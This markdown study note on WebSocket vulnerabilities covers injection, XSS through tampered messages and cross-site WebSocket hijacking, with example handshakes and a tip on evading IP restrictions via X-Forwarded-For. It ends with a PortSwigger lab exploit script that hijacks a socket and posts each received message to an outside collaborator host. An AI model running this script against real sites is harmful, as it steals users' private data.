## WebSockets security vulnerabilities

In principle, practically any web security vulnerability might arise in relation to WebSockets:

1. User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection.
2. Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques.
3. If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.

**Note:** In some cases you can bypass ip based restrictions while testing via `X-Forwarded-For` header if there any malicious activity detected by server.

## What makes a WebSocket vulnerable to CSWSH?

* Uses cookie-based authentication (cookies are sent automatically).
* Does not validate the `Origin` header during the handshake.
* Sends or receives sensitive data after connection.
* Does not require extra authentication after connecting.

---

**Vulnerable WebSocket handshake request:**

```
GET /chat HTTP/1.1
Host: vulnerable.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://attacker.com
Cookie: session=abcd1234efgh5678ijkl9012mnop3456
```

**Vulnerable response:**

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

*The server accepts the connection despite the cross-origin `Origin`. This allows attackers to hijack the session.*

---

**Non-vulnerable WebSocket handshake request:**

```
GET /chat HTTP/1.1
Host: secure.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://attacker.com
Cookie: session=abcd1234efgh5678ijkl9012mnop3456
```

**Non-vulnerable response:**

```
HTTP/1.1 403 Forbidden
Content-Type: text/plain

Invalid Origin: https://attacker.com
```

*The server rejects the connection because the `Origin` does not match the allowed domain, preventing CSWSH.*

---

### Manipulating Websocket Messages
The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by tampering with the contents of WebSocket messages.

For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:
<br>
<br>
`{"message":"test"}`

In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:

<img width="1915" height="229" alt="Screenshot From 2025-07-27 23-21-33" src="https://github.com/user-attachments/assets/793568d5-00b8-4182-99e6-98d3a67da6a4" />

### Cross-site WebSocket hijacking
Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. 

<img width="1917" height="203" alt="Screenshot From 2025-07-28 01-00-37" src="https://github.com/user-attachments/assets/20807506-024e-47a2-a976-35c8cd6339e5" />

It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

[Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

####  Exploit
```js
<script>
    var ws = new WebSocket('wss://0a820003036953d283898de6004b0013.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://agus9fqks1acunox6p9wrogmndt4hv5k.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
